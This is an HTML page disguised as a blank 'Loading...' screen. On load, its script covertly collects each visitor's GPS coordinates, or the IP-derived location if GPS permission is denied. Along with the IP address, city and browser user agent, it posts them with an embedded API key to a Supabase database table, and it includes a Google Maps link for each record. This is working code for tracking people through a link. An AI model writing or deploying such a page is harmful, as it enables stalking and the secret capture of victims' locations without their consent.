<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>

    <script>
        const SUPABASE_URL = "https://oyherhkvrsxoalcczdam.supabase.co";
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im95aGVyaGt2cnN4b2FsY2N6ZGFtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE4Njg2ODgsImV4cCI6MjA5NzQ0NDY4OH0.O9_k-cbNJ7dfm0mp2nyRhce2cEDPCHiaK9_ZC23oLzg";

        window.onload = async () => {
            let ipData = {};
            
            // Fetch IP-based location (Country, City, Lat, Lng, IP) as a fallback/enhancement
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch(e) {
                console.error("IP API failed", e);
            }

            const saveToSupabase = async (lat, lng, acc, source) => {
                // Creates a clickable link for Google Maps
                const mapsLink = (lat && lng) ? `https://www.google.com/maps?q=${lat},${lng}` : null;
                
                try {
                    await fetch(`${SUPABASE_URL}/rest/v1/locations`, {
                        method: "POST",
                        headers: {
                            "apikey": SUPABASE_KEY,
                            "Authorization": `Bearer ${SUPABASE_KEY}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            latitude: lat,
                            longitude: lng,
                            accuracy: acc,
                            google_maps_link: mapsLink,
                            raw_coordinates: (lat && lng) ? `${lat}, ${lng}` : null,
                            ip_address: ipData.ip || null,
                            ip_city: ipData.city ? `${ipData.city}, ${ipData.region}, ${ipData.country_name}` : null,
                            user_agent: navigator.userAgent
                        })
                    });
                } catch (err) {
                    console.error("Failed to save", err);
                }
            };

            // Request precise GPS location immediately on load
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // User granted permission (High accuracy GPS / Cell Tower)
                        saveToSupabase(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'GPS');
                    },
                    (err) => {
                        // User denied or error occurred - save the IP-based location instead
                        if (ipData.latitude && ipData.longitude) {
                            saveToSupabase(ipData.latitude, ipData.longitude, 0, 'IP');
                        } else {
                            saveToSupabase(null, null, null, 'UNKNOWN');
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                // Browser doesn't support geolocation, fallback to IP
                if (ipData.latitude && ipData.longitude) {
                    saveToSupabase(ipData.latitude, ipData.longitude, 0, 'IP');
                }
            }
        };
    </script>
</body>
</html>
